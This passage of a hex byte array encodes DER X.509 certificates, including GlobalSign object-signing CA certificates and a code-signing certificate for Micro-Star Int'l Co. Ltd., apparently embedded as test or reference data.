  0xba, 0x09, 0x71, 0x24, 0x18, 0xdf, 0xa1, 0x06, 0x62, 0x29, 0x12, 0x9e, 0xdc, 0x9e, 0x75, 0x73,
  0xe8, 0xdf, 0x56, 0x57, 0x69, 0x96, 0x13, 0x56, 0x4f, 0xf2, 0xc8, 0xbc, 0x01, 0x58, 0xed, 0x26,
  0x86, 0x72, 0x0b, 0x60, 0xf5, 0x19, 0xc5, 0x55, 0x03, 0x57, 0x9b, 0xb9, 0x10, 0xc9, 0xa1, 0xd4,
  0x74, 0x40, 0xff, 0x6c, 0x00, 0xe8, 0xe6, 0x53, 0x37, 0xfe, 0xb7, 0xda, 0x79, 0x3e, 0xb8, 0x52,
  0x38, 0xe9, 0x81, 0x2c, 0x9f, 0x0e, 0x33, 0x52, 0xa6, 0xcd, 0x70, 0xce, 0x4a, 0x5d, 0x62, 0xf4,
  0xd1, 0x67, 0x5e, 0xbc, 0x97, 0x4a, 0x07, 0xca, 0xbc, 0xdd, 0x8d, 0x47, 0xb1, 0xcd, 0xf1, 0x65,
  0x5b, 0x85, 0x01, 0xb0, 0x4b, 0x6b, 0xde, 0xcd, 0x8e, 0x2e, 0xf5, 0x50, 0xe8, 0xa3, 0x9c, 0x9d,
  0x26, 0x98, 0x6b, 0x36, 0x63, 0x41, 0x03, 0x70, 0x44, 0xf0, 0x5f, 0xe2, 0x25, 0x75, 0x79, 0x50,
  0x7d, 0x5f, 0xa1, 0x06, 0xa2, 0x46, 0x0c, 0x55, 0x95, 0x47, 0x14, 0xd3, 0x91, 0x46, 0x86, 0x68,
  0x99, 0xe7, 0x27, 0xf4, 0x94, 0xec, 0x9a, 0x41, 0x51, 0xf7, 0x96, 0xd4, 0x7a, 0x8c, 0xe1, 0x44,
  0x97, 0x68, 0x71, 0x03, 0xd8, 0x58, 0x6f, 0xbd, 0xb4, 0x10, 0x42, 0xee, 0x0d, 0x66, 0x75, 0x46,
  0x8b, 0x44, 0x96, 0xd2, 0x30, 0x00, 0x12, 0x07, 0x63, 0xf7, 0x44, 0x9b, 0x01, 0x70, 0xca, 0x56,
  0x6f, 0x9c, 0x58, 0x97, 0x2a, 0x27, 0x17, 0x8b, 0x2e, 0x71, 0x52, 0x6d, 0x46, 0xab, 0xa7, 0x2b,
  0x0f, 0x7f, 0x16, 0x48, 0x64, 0xc8, 0x52, 0xfa, 0x06, 0x17, 0x00, 0x07, 0x74, 0xd7, 0x45, 0xb3,
  0x0c, 0xf5, 0x78, 0x95, 0x73, 0xe8, 0x0a, 0xee, 0xc4, 0xe0, 0x72, 0x8c, 0x1e, 0x11, 0xaa, 0x1e,
  0xbb, 0x5e, 0xce, 0xf9, 0xb4, 0x00, 0xee, 0x73, 0xbd, 0xcd, 0x02, 0x03, 0x01, 0x00, 0x01, 0xa3,
  0x81, 0x99, 0x30, 0x81, 0x96, 0x30, 0x0e, 0x06, 0x03, 0x55, 0x1d, 0x0f, 0x01, 0x01, 0xff, 0x04,
  0x04, 0x03, 0x02, 0x01, 0x06, 0x30, 0x0f, 0x06, 0x03, 0x55, 0x1d, 0x13, 0x01, 0x01, 0xff, 0x04,
  0x05, 0x30, 0x03, 0x01, 0x01, 0xff, 0x30, 0x1d, 0x06, 0x03, 0x55, 0x1d, 0x0e, 0x04, 0x16, 0x04,
  0x14, 0x15, 0x51, 0x79, 0x1a, 0x7c, 0x0c, 0x59, 0xf9, 0xda, 0xcd, 0xd8, 0xc4, 0x3a, 0x13, 0x9a,
  0xc9, 0x78, 0x2d, 0x7f, 0x4d, 0x30, 0x33, 0x06, 0x03, 0x55, 0x1d, 0x1f, 0x04, 0x2c, 0x30, 0x2a,
  0x30, 0x28, 0xa0, 0x26, 0xa0, 0x24, 0x86, 0x22, 0x68, 0x74, 0x74, 0x70, 0x3a, 0x2f, 0x2f, 0x63,
  0x72, 0x6c, 0x2e, 0x67, 0x6c, 0x6f, 0x62, 0x61, 0x6c, 0x73, 0x69, 0x67, 0x6e, 0x2e, 0x6e, 0x65,
  0x74, 0x2f, 0x52, 0x6f, 0x6f, 0x74, 0x2e, 0x63, 0x72, 0x6c, 0x30, 0x1f, 0x06, 0x03, 0x55, 0x1d,
  0x23, 0x04, 0x18, 0x30, 0x16, 0x80, 0x14, 0x60, 0x7b, 0x66, 0x1a, 0x45, 0x0d, 0x97, 0xca, 0x89,
  0x50, 0x2f, 0x7d, 0x04, 0xcd, 0x34, 0xa8, 0xff, 0xfc, 0xfd, 0x4b, 0x30, 0x0d, 0x06, 0x09, 0x2a,
  0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x05, 0x05, 0x00, 0x03, 0x82, 0x01, 0x01, 0x00, 0xa0,
  0x42, 0x2e, 0xb8, 0x76, 0xa7, 0x42, 0x71, 0x86, 0x40, 0x4d, 0x46, 0x4d, 0x5b, 0x26, 0xb0, 0xb0,
  0x74, 0xf9, 0x3f, 0x89, 0xa8, 0x7b, 0x7c, 0xb7, 0xf1, 0xc6, 0x97, 0xe0, 0x82, 0x39, 0x99, 0x9d,
  0x43, 0xfe, 0x60, 0x82, 0x36, 0x42, 0xb5, 0x5b, 0x87, 0x8d, 0xf5, 0x5d, 0xf4, 0xbb, 0xff, 0xa9,
  0x10, 0x44, 0xa8, 0x71, 0xd3, 0xc7, 0xf1, 0x22, 0x41, 0xf2, 0x9a, 0xa4, 0xa5, 0xec, 0x63, 0xfa,
  0xe5, 0xeb, 0x65, 0x4a, 0x19, 0x30, 0x9d, 0x8b, 0xc7, 0xb6, 0xfd, 0xdc, 0x3f, 0xe1, 0x6c, 0xfd,
  0xd5, 0x52, 0x14, 0x07, 0xfc, 0x6d, 0x24, 0xcc, 0xb3, 0xcc, 0x81, 0xa2, 0xc0, 0x52, 0xf3, 0x27,
  0xb9, 0x6d, 0x9e, 0x06, 0x3d, 0xd8, 0xa8, 0x49, 0x02, 0x32, 0x69, 0xc7, 0x05, 0x42, 0x94, 0xd0,
  0xbb, 0xe3, 0xbb, 0xa9, 0x08, 0xc3, 0x93, 0x50, 0x1b, 0xdb, 0x84, 0x6d, 0xc0, 0xba, 0x1e, 0x52,
  0x98, 0x65, 0x9c, 0x13, 0x76, 0xbd, 0xb3, 0xd5, 0x67, 0x29, 0x2f, 0x1f, 0x7b, 0xaa, 0x2c, 0x51,
  0xa0, 0xfd, 0x85, 0x4f, 0x26, 0x3c, 0x48, 0xa3, 0x81, 0x27, 0xa6, 0xfe, 0xee, 0x7f, 0x78, 0x99,
  0xc2, 0x45, 0xcf, 0x9d, 0x1f, 0x52, 0x7e, 0xd7, 0x95, 0x8b, 0xfd, 0xe1, 0xd0, 0x20, 0xc3, 0xaf,
  0x7e, 0x51, 0xa2, 0x2f, 0x66, 0x3b, 0xab, 0x2d, 0xcf, 0x2d, 0x8e, 0x8c, 0x4d, 0x7d, 0x18, 0x39,
  0x21, 0x28, 0xfb, 0xdc, 0xae, 0x6d, 0x65, 0x81, 0xd0, 0xe0, 0xd7, 0x18, 0x4b, 0xe7, 0xb5, 0xf7,
  0x74, 0xd7, 0x84, 0xe6, 0x52, 0x2a, 0xac, 0x3b, 0x68, 0xfd, 0x3b, 0x4a, 0xb8, 0x01, 0x54, 0x84,
  0x91, 0x32, 0xbb, 0x95, 0xd2, 0x8e, 0x63, 0x30, 0xa6, 0x9e, 0xce, 0x23, 0x96, 0xfe, 0xab, 0x2e,
  0xb8, 0x6a, 0x8b, 0x74, 0xdc, 0xde, 0x21, 0xa1, 0x14, 0xc2, 0xfb, 0xbf, 0x53, 0xaf, 0x10, 0x30,
  0x82, 0x03, 0xfb, 0x30, 0x82, 0x02, 0xe3, 0xa0, 0x03, 0x02, 0x01, 0x02, 0x02, 0x0b, 0x01, 0x00,
  0x00, 0x00, 0x00, 0x01, 0x1c, 0x08, 0xb7, 0xf6, 0x7e, 0x30, 0x0d, 0x06, 0x09, 0x2a, 0x86, 0x48,
  0x86, 0xf7, 0x0d, 0x01, 0x01, 0x05, 0x05, 0x00, 0x30, 0x63, 0x31, 0x0b, 0x30, 0x09, 0x06, 0x03,
  0x55, 0x04, 0x06, 0x13, 0x02, 0x42, 0x45, 0x31, 0x19, 0x30, 0x17, 0x06, 0x03, 0x55, 0x04, 0x0a,
  0x13, 0x10, 0x47, 0x6c, 0x6f, 0x62, 0x61, 0x6c, 0x53, 0x69, 0x67, 0x6e, 0x20, 0x6e, 0x76, 0x2d,
  0x73, 0x61, 0x31, 0x16, 0x30, 0x14, 0x06, 0x03, 0x55, 0x04, 0x0b, 0x13, 0x0d, 0x4f, 0x62, 0x6a,
  0x65, 0x63, 0x74, 0x53, 0x69, 0x67, 0x6e, 0x20, 0x43, 0x41, 0x31, 0x21, 0x30, 0x1f, 0x06, 0x03,
  0x55, 0x04, 0x03, 0x13, 0x18, 0x47, 0x6c, 0x6f, 0x62, 0x61, 0x6c, 0x53, 0x69, 0x67, 0x6e, 0x20,
  0x4f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x53, 0x69, 0x67, 0x6e, 0x20, 0x43, 0x41, 0x30, 0x1e, 0x17,
  0x0d, 0x30, 0x38, 0x30, 0x38, 0x32, 0x38, 0x30, 0x39, 0x34, 0x39, 0x34, 0x35, 0x5a, 0x17, 0x0d,
  0x31, 0x31, 0x30, 0x38, 0x32, 0x38, 0x30, 0x39, 0x34, 0x39, 0x34, 0x35, 0x5a, 0x30, 0x55, 0x31,
  0x0b, 0x30, 0x09, 0x06, 0x03, 0x55, 0x04, 0x06, 0x13, 0x02, 0x54, 0x57, 0x31, 0x22, 0x30, 0x20,
  0x06, 0x03, 0x55, 0x04, 0x0a, 0x13, 0x19, 0x4d, 0x69, 0x63, 0x72, 0x6f, 0x2d, 0x53, 0x74, 0x61,
  0x72, 0x20, 0x49, 0x6e, 0x74, 0x27, 0x6c, 0x20, 0x43, 0x6f, 0x2e, 0x20, 0x4c, 0x74, 0x64, 0x2e,
  0x31, 0x22, 0x30, 0x20, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x19, 0x4d, 0x69, 0x63, 0x72, 0x6f,
  0x2d, 0x53, 0x74, 0x61, 0x72, 0x20, 0x49, 0x6e, 0x74, 0x27, 0x6c, 0x20, 0x43, 0x6f, 0x2e, 0x20,
  0x4c, 0x74, 0x64, 0x2e, 0x30, 0x81, 0x9f, 0x30, 0x0d, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7,
  0x0d, 0x01, 0x01, 0x01, 0x05, 0x00, 0x03, 0x81, 0x8d, 0x00, 0x30, 0x81, 0x89, 0x02, 0x81, 0x81,
  0x00, 0xbe, 0x27, 0x94, 0x99, 0x6c, 0x4b, 0x3f, 0xa3, 0x9c, 0x28, 0xf8, 0xe6, 0x12, 0x4a, 0x05,
  0xa5, 0x31, 0x64, 0x41, 0xdf, 0xe0, 0xf0, 0x87, 0xd5, 0x9d, 0xfb, 0xc1, 0x12, 0x59, 0xf8, 0x8f,
  0x80, 0x67, 0xd6, 0x9b, 0x9f, 0x60, 0x46, 0xea, 0xf0, 0x84, 0xb1, 0x62, 0x9a, 0x2c, 0xa0, 0xbf,
  0x24, 0x98, 0xa3, 0x1b, 0x4f, 0x18, 0x1d, 0x1e, 0x1e, 0x95, 0x2e, 0x87, 0x09, 0x44, 0x25, 0x60,
  0x88, 0x96, 0x7c, 0xa0, 0x45, 0x95, 0x8d, 0x07, 0x1e, 0x9c, 0x13, 0x5e, 0x8d, 0xc1, 0xcd, 0xcb,
  0x66, 0xb8, 0xb3, 0xc6, 0x5a, 0x2a, 0xfd, 0x30, 0x03, 0x05, 0x5d, 0x7d, 0xa2, 0xcd, 0xbe, 0x8a,
  0x1e, 0xb7, 0x88, 0x95, 0x18, 0xcf, 0x35, 0x89, 0x14, 0x88, 0xb3, 0xe8, 0xa8, 0x49, 0xce, 0x2a,
  0x19, 0x5c, 0x7d, 0x3a, 0xbd, 0xfc, 0x5e, 0xa0, 0x10, 0x35, 0xd6, 0x75, 0xb1, 0xfc, 0xd9, 0xca,
  0x35, 0x02, 0x03, 0x01, 0x00, 0x01, 0xa3, 0x82, 0x01, 0x40, 0x30, 0x82, 0x01, 0x3c, 0x30, 0x1f,
  0x06, 0x03, 0x55, 0x1d, 0x23, 0x04, 0x18, 0x30, 0x16, 0x80, 0x14, 0xd2, 0x5b, 0xf3, 0x4b, 0x26,
  0x4b, 0xa5, 0xb0, 0xe7, 0x5d, 0xfd, 0x56, 0x7f, 0xf6, 0xf1, 0x2e, 0x38, 0x4e, 0x53, 0xa0, 0x30,
  0x4e, 0x06, 0x08, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x07, 0x01, 0x01, 0x04, 0x42, 0x30, 0x40, 0x30,
  0x3e, 0x06, 0x08, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x07, 0x30, 0x02, 0x86, 0x32, 0x68, 0x74, 0x74,
  0x70, 0x3a, 0x2f, 0x2f, 0x73, 0x65, 0x63, 0x75, 0x72, 0x65, 0x2e, 0x67, 0x6c, 0x6f, 0x62, 0x61,
  0x6c, 0x73, 0x69, 0x67, 0x6e, 0x2e, 0x6e, 0x65, 0x74, 0x2f, 0x63, 0x61, 0x63, 0x65, 0x72, 0x74,
  0x2f, 0x4f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x53, 0x69, 0x67, 0x6e, 0x2e, 0x63, 0x72, 0x74, 0x30,
  0x39, 0x06, 0x03, 0x55, 0x1d, 0x1f, 0x04, 0x32, 0x30, 0x30, 0x30, 0x2e, 0xa0, 0x2c, 0xa0, 0x2a,
  0x86, 0x28, 0x68, 0x74, 0x74, 0x70, 0x3a, 0x2f, 0x2f, 0x63, 0x72, 0x6c, 0x2e, 0x67, 0x6c, 0x6f,
  0x62, 0x61, 0x6c, 0x73, 0x69, 0x67, 0x6e, 0x2e, 0x6e, 0x65, 0x74, 0x2f, 0x4f, 0x62, 0x6a, 0x65,
  0x63, 0x74, 0x53, 0x69, 0x67, 0x6e, 0x2e, 0x63, 0x72, 0x6c, 0x30, 0x09, 0x06, 0x03, 0x55, 0x1d,
  0x13, 0x04, 0x02, 0x30, 0x00, 0x30, 0x0e, 0x06, 0x03, 0x55, 0x1d, 0x0f, 0x01, 0x01, 0xff, 0x04,
  0x04, 0x03, 0x02, 0x07, 0x80, 0x30, 0x13, 0x06, 0x03, 0x55, 0x1d, 0x25, 0x04, 0x0c, 0x30, 0x0a,
  0x06, 0x08, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x07, 0x03, 0x03, 0x30, 0x4b, 0x06, 0x03, 0x55, 0x1d,
  0x20, 0x04, 0x44, 0x30, 0x42, 0x30, 0x40, 0x06, 0x09, 0x2b, 0x06, 0x01, 0x04, 0x01, 0xa0, 0x32,
  0x01, 0x32, 0x30, 0x33, 0x30, 0x31, 0x06, 0x08, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x07, 0x02, 0x01,
  0x16, 0x25, 0x68, 0x74, 0x74, 0x70, 0x3a, 0x2f, 0x2f, 0x77, 0x77, 0x77, 0x2e, 0x67, 0x6c, 0x6f,
  0x62, 0x61, 0x6c, 0x73, 0x69, 0x67, 0x6e, 0x2e, 0x6e, 0x65, 0x74, 0x2f, 0x72, 0x65, 0x70, 0x6f,
  0x73, 0x69, 0x74, 0x6f, 0x72, 0x79, 0x2f, 0x30, 0x11, 0x06, 0x09, 0x60, 0x86, 0x48, 0x01, 0x86,
  0xf8, 0x42, 0x01, 0x01, 0x04, 0x04, 0x03, 0x02, 0x04, 0x10, 0x30, 0x0d, 0x06, 0x09, 0x2a, 0x86,
  0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x05, 0x05, 0x00, 0x03, 0x82, 0x01, 0x01, 0x00, 0x57, 0x2d,
  0xf3, 0x73, 0xe9, 0xb0, 0x36, 0x71, 0x1b, 0x3c, 0xf5, 0xee, 0x88, 0x2e, 0x5d, 0x75, 0xd8, 0xd5,
  0x0f, 0x01, 0x24, 0x07, 0xcf, 0x0c, 0x1b, 0x55, 0x4f, 0xf8, 0xf4, 0x1c, 0x7b, 0x64, 0x77, 0xfa,
  0x0b, 0x2a, 0xd5, 0x79, 0xf2, 0xc1, 0xfe, 0x7b, 0x8b, 0x9d, 0x73, 0x74, 0xb6, 0x90, 0x52, 0x7c,
  0x21, 0x9e, 0xb9, 0x79, 0x68, 0x6f, 0xb6, 0x7d, 0x0b, 0x4c, 0xf2, 0x88, 0x5d, 0x8d, 0x7d, 0x12,
  0x61, 0xf0, 0x5c, 0xb7, 0x2f, 0xe4, 0xc9, 0xf2, 0x94, 0xc5, 0x2a, 0xa0, 0x5f, 0x3e, 0x5d, 0x1c,
  0xeb, 0x0d, 0x77, 0x08, 0x5d, 0xbd, 0x6a, 0xf0, 0x79, 0x78, 0x03, 0x25, 0x05, 0xda, 0x66, 0x6f,
  0x35, 0x32, 0x83, 0xa8, 0x98, 0x2a, 0xf2, 0x69, 0x85, 0xe6, 0x9c, 0x15, 0x99, 0x47, 0x99, 0x45,
  0xb5, 0x91, 0x12, 0x41, 0x83, 0x57, 0x4b, 0x8a, 0x4c, 0xc3, 0x4c, 0xaa, 0x62, 0xe3, 0x1b, 0x52,
  0x3d, 0xac, 0x3f, 0xed, 0xbd, 0x04, 0x95, 0x1b, 0x36, 0x61, 0x39, 0x9e, 0xd3, 0x4f, 0x5c, 0x58,
  0x68, 0xd9, 0xbb, 0xe3, 0x29, 0x5f, 0xc0, 0x98, 0x90, 0xd9, 0x52, 0x1e, 0x1c, 0xdc, 0xae, 0x2f,
  0xf1, 0x29, 0xf5, 0x47, 0xd4, 0xc8, 0xce, 0x8a, 0xa0, 0x86, 0x16, 0x10, 0x7c, 0x55, 0x5f, 0xac,
  0x60, 0xe5, 0xb6, 0x3c, 0x14, 0xdd, 0xfe, 0xb6, 0x96, 0x2a, 0xf3, 0x60, 0x8b, 0x75, 0xd9, 0xc7,
  0x7c, 0x69, 0x26, 0x0d, 0x8a, 0xf9, 0x77, 0x5b, 0x83, 0xaf, 0xaa, 0x15, 0xb8, 0xec, 0xef, 0x68,
  0x40, 0xcb, 0x4e, 0xe8, 0x7d, 0x45, 0x1f, 0x90, 0x42, 0xb4, 0x97, 0x35, 0xea, 0x40, 0x93, 0x1c,
  0x06, 0x64, 0xc8, 0xc2, 0xbf, 0x6a, 0x13, 0x9d, 0xb6, 0xac, 0x5b, 0x90, 0xed, 0xce, 0xa6, 0x3a,
  0x6b, 0xf5, 0xb5, 0x49, 0x78, 0xf0, 0x27, 0xb1, 0x04, 0x61, 0x70, 0xd4, 0x76, 0xd0, 0x30, 0x82,
  0x04, 0xbe, 0x30, 0x82, 0x03, 0xa6, 0xa0, 0x03, 0x02, 0x01, 0x02, 0x02, 0x0b, 0x04, 0x00, 0x00,
  0x00, 0x00, 0x01, 0x17, 0xab, 0x50, 0xb9, 0x15, 0x30, 0x0d, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86,
  0xf7, 0x0d, 0x01, 0x01, 0x05, 0x05, 0x00, 0x30, 0x81, 0x81, 0x31, 0x0b, 0x30, 0x09, 0x06, 0x03,
  0x55, 0x04, 0x06, 0x13, 0x02, 0x42, 0x45, 0x31, 0x19, 0x30, 0x17, 0x06, 0x03, 0x55, 0x04, 0x0a,
  0x13, 0x10, 0x47, 0x6c, 0x6f, 0x62, 0x61, 0x6c, 0x53, 0x69, 0x67, 0x6e, 0x20, 0x6e, 0x76, 0x2d,
  0x73, 0x61, 0x31, 0x25, 0x30, 0x23, 0x06, 0x03, 0x55, 0x04, 0x0b, 0x13, 0x1c, 0x50, 0x72, 0x69,
  0x6d, 0x61, 0x72, 0x79, 0x20, 0x4f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x20, 0x50, 0x75, 0x62, 0x6c,
  0x69, 0x73, 0x68, 0x69, 0x6e, 0x67, 0x20, 0x43, 0x41, 0x31, 0x30, 0x30, 0x2e, 0x06, 0x03, 0x55,
  0x04, 0x03, 0x13, 0x27, 0x47, 0x6c, 0x6f, 0x62, 0x61, 0x6c, 0x53, 0x69, 0x67, 0x6e, 0x20, 0x50,
  0x72, 0x69, 0x6d, 0x61, 0x72, 0x79, 0x20, 0x4f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x20, 0x50, 0x75,
  0x62, 0x6c, 0x69, 0x73, 0x68, 0x69, 0x6e, 0x67, 0x20, 0x43, 0x41, 0x30, 0x1e, 0x17, 0x0d, 0x30,
  0x34, 0x30, 0x31, 0x32, 0x32, 0x30, 0x39, 0x30, 0x30, 0x30, 0x30, 0x5a, 0x17, 0x0d, 0x31, 0x34,
  0x30, 0x31, 0x32, 0x37, 0x31, 0x30, 0x30, 0x30, 0x30, 0x30, 0x5a, 0x30, 0x63, 0x31, 0x0b, 0x30,
  0x09, 0x06, 0x03, 0x55, 0x04, 0x06, 0x13, 0x02, 0x42, 0x45, 0x31, 0x19, 0x30, 0x17, 0x06, 0x03,
  0x55, 0x04, 0x0a, 0x13, 0x10, 0x47, 0x6c, 0x6f, 0x62, 0x61, 0x6c, 0x53, 0x69, 0x67, 0x6e, 0x20,
  0x6e, 0x76, 0x2d, 0x73, 0x61, 0x31, 0x16, 0x30, 0x14, 0x06, 0x03, 0x55, 0x04, 0x0b, 0x13, 0x0d,
  0x4f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x53, 0x69, 0x67, 0x6e, 0x20, 0x43, 0x41, 0x31, 0x21, 0x30,
  0x1f, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x18, 0x47, 0x6c, 0x6f, 0x62, 0x61, 0x6c, 0x53, 0x69,
  0x67, 0x6e, 0x20, 0x4f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x53, 0x69, 0x67, 0x6e, 0x20, 0x43, 0x41,
  0x30, 0x82, 0x01, 0x22, 0x30, 0x0d, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01,
  0x01, 0x05, 0x00, 0x03, 0x82, 0x01, 0x0f, 0x00, 0x30, 0x82, 0x01, 0x0a, 0x02, 0x82, 0x01, 0x01,
  0x00, 0xb0, 0xb1, 0xf2, 0x80, 0x00, 0x70, 0xce, 0xec, 0xc3, 0x8c, 0xb4, 0x97, 0xed, 0xc6, 0x09,
  0x8c, 0x26, 0x6f, 0x89, 0xdf, 0x67, 0x59, 0x81, 0xcf, 0xde, 0x14, 0x13, 0x4c, 0xc2, 0xb1, 0x45,
  0xe2, 0x53, 0x75, 0x41, 0xfa, 0x07, 0x36, 0x6f, 0xba, 0x11, 0x70, 0x28, 0x94, 0x7c, 0x6d, 0x72,
  0xbd, 0x07, 0x15, 0x25, 0x65, 0x3a, 0x09, 0xff, 0x85, 0xdc, 0xfa, 0x7b, 0x5e, 0x37, 0x87, 0x38,
  0xe4, 0xc7, 0x4b, 0x08, 0x80, 0x98, 0x9e, 0x8a, 0xcd, 0x58, 0x09, 0x02, 0xc0, 0xc3, 0x01, 0x49,
  0x96, 0x58, 0x88, 0x89, 0x26, 0x59, 0xf5, 0x6d, 0xc6, 0xb9, 0xc1, 0xfb, 0x18, 0x25, 0xed, 0xd8,
  0x62, 0x4e, 0xca, 0x0a, 0x6c, 0x5d, 0x70, 0xef, 0xce, 0xd3, 0x9b, 0x29, 0x0b, 0x09, 0xc6, 0xf6,
  0xee, 0xb6, 0x16, 0xd4, 0x3c, 0x54, 0x8e, 0xcc, 0x5d, 0xe0, 0xaf, 0xdb, 0xdd, 0x23, 0x09, 0x32,
  0x7b, 0x32, 0x81, 0x16, 0x62, 0x0a, 0x06, 0xcb, 0x7a, 0xcf, 0x34, 0x21, 0xb6, 0x6f, 0x36, 0xb6,
  0xb1, 0xce, 0xcb, 0x9a, 0x29, 0x35, 0x40, 0x3e, 0x9d, 0x58, 0x7c, 0xff, 0xad, 0x82, 0x98, 0xfa,
  0xb8, 0xd5, 0x89, 0xca, 0x35, 0xdd, 0xcb, 0xcd, 0x57, 0x06, 0xcb, 0x9b, 0xe4, 0xbf, 0x94, 0xa8,
  0x80, 0x98, 0x5f, 0x77, 0x96, 0xf0, 0xb6, 0xe7, 0xab, 0x74, 0x79, 0x40, 0x21, 0xa6, 0x63, 0xe9,
  0xd0, 0x07, 0x91, 0xbd, 0x85, 0x38, 0xb4, 0xae, 0x96, 0xac, 0xa1, 0xff, 0x14, 0x73, 0xda, 0xa5,
  0x45, 0xb8, 0x4d, 0x86, 0xce, 0x2a, 0x3c, 0xef, 0xd4, 0xdf, 0x28, 0x0e, 0x75, 0xa9, 0xa8, 0x88,
  0x13, 0xc2, 0xe4, 0x7c, 0x60, 0x93, 0xf2, 0x25, 0xcc, 0x03, 0x84, 0x97, 0xe6, 0x4e, 0xb6, 0x9f,
  0x2d, 0xd6, 0xb5, 0x8b, 0x34, 0x3c, 0xab, 0xd5, 0x38, 0x3a, 0xc8, 0x3d, 0xc4, 0xb1, 0xf9, 0x94,
  0xcd, 0x02, 0x03, 0x01, 0x00, 0x01, 0xa3, 0x82, 0x01, 0x52, 0x30, 0x82, 0x01, 0x4e, 0x30, 0x0e,
  0x06, 0x03, 0x55, 0x1d, 0x0f, 0x01, 0x01, 0xff, 0x04, 0x04, 0x03, 0x02, 0x01, 0x06, 0x30, 0x12,
  0x06, 0x03, 0x55, 0x1d, 0x13, 0x01, 0x01, 0xff, 0x04, 0x08, 0x30, 0x06, 0x01, 0x01, 0xff, 0x02,
  0x01, 0x00, 0x30, 0x1d, 0x06, 0x03, 0x55, 0x1d, 0x0e, 0x04, 0x16, 0x04, 0x14, 0xd2, 0x5b, 0xf3,
  0x4b, 0x26, 0x4b, 0xa5, 0xb0, 0xe7, 0x5d, 0xfd, 0x56, 0x7f, 0xf6, 0xf1, 0x2e, 0x38, 0x4e, 0x53,
  0xa0, 0x30, 0x4a, 0x06, 0x03, 0x55, 0x1d, 0x20, 0x04, 0x43, 0x30, 0x41, 0x30, 0x3f, 0x06, 0x09,
  0x2b, 0x06, 0x01, 0x04, 0x01, 0xa0, 0x32, 0x01, 0x32, 0x30, 0x32, 0x30, 0x30, 0x06, 0x08, 0x2b,
  0x06, 0x01, 0x05, 0x05, 0x07, 0x02, 0x01, 0x16, 0x24, 0x68, 0x74, 0x74, 0x70, 0x3a, 0x2f, 0x2f,
  0x77, 0x77, 0x77, 0x2e, 0x67, 0x6c, 0x6f, 0x62, 0x61, 0x6c, 0x73, 0x69, 0x67, 0x6e, 0x2e, 0x6e,
  0x65, 0x74, 0x2f, 0x72, 0x65, 0x70, 0x6f, 0x73, 0x69, 0x74, 0x6f, 0x72, 0x79, 0x30, 0x39, 0x06,
  0x03, 0x55, 0x1d, 0x1f, 0x04, 0x32, 0x30, 0x30, 0x30, 0x2e, 0xa0, 0x2c, 0xa0, 0x2a, 0x86, 0x28,
  0x68, 0x74, 0x74, 0x70, 0x3a, 0x2f, 0x2f, 0x63, 0x72, 0x6c, 0x2e, 0x67, 0x6c, 0x6f, 0x62, 0x61,
  0x6c, 0x73, 0x69, 0x67, 0x6e, 0x2e, 0x6e, 0x65, 0x74, 0x2f, 0x70, 0x72, 0x69, 0x6d, 0x6f, 0x62,
  0x6a, 0x65, 0x63, 0x74, 0x2e, 0x63, 0x72, 0x6c, 0x30, 0x4e, 0x06, 0x08, 0x2b, 0x06, 0x01, 0x05,
  0x05, 0x07, 0x01, 0x01, 0x04, 0x42, 0x30, 0x40, 0x30, 0x3e, 0x06, 0x08, 0x2b, 0x06, 0x01, 0x05,
  0x05, 0x07, 0x30, 0x02, 0x86, 0x32, 0x68, 0x74, 0x74, 0x70, 0x3a, 0x2f, 0x2f, 0x73, 0x65, 0x63,
  0x75, 0x72, 0x65, 0x2e, 0x67, 0x6c, 0x6f, 0x62, 0x61, 0x6c, 0x73, 0x69, 0x67, 0x6e, 0x2e, 0x6e,
  0x65, 0x74, 0x2f, 0x63, 0x61, 0x63, 0x65, 0x72, 0x74, 0x2f, 0x50, 0x72, 0x69, 0x6d, 0x4f, 0x62,
  0x6a, 0x65, 0x63, 0x74, 0x2e, 0x63, 0x72, 0x74, 0x30, 0x11, 0x06, 0x09, 0x60, 0x86, 0x48, 0x01,
  0x86, 0xf8, 0x42, 0x01, 0x01, 0x04, 0x04, 0x03, 0x02, 0x00, 0x01, 0x30, 0x1f, 0x06, 0x03, 0x55,
  0x1d, 0x23, 0x04, 0x18, 0x30, 0x16, 0x80, 0x14, 0x15, 0x51, 0x79, 0x1a, 0x7c, 0x0c, 0x59, 0xf9,
  0xda, 0xcd, 0xd8, 0xc4, 0x3a, 0x13, 0x9a, 0xc9, 0x78, 0x2d, 0x7f, 0x4d, 0x30, 0x0d, 0x06, 0x09,
  0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x05, 0x05, 0x00, 0x03, 0x82, 0x01, 0x01, 0x00,
  0x3c, 0x4a, 0x01, 0x02, 0x67, 0xed, 0xf2, 0x0a, 0x2e, 0x73, 0x6e, 0x40, 0x25, 0x2f, 0x1d, 0xcc,
  0xbc, 0x2d, 0xb6, 0x52, 0x14, 0x1b, 0x27, 0x12, 0x2c, 0xf1, 0x22, 0x9e, 0x19, 0x0a, 0x89, 0xb6,
  0xef, 0x35, 0x2a, 0x29, 0x15, 0x2b, 0x1a, 0x88, 0xc2, 0x0f, 0x37, 0x16, 0x8d, 0x26, 0x02, 0xd5,
  0xe9, 0x30, 0x80, 0xf6, 0x08, 0xb9, 0x93, 0x9a, 0xc0, 0x49, 0x8f, 0x33, 0x2c, 0x30, 0x35, 0xff,
  0x4a, 0xb9, 0x89, 0x2a, 0xa7, 0x5c, 0x38, 0xe7, 0x61, 0xa7, 0x78, 0xfe, 0x22, 0x85, 0x1a, 0x07,
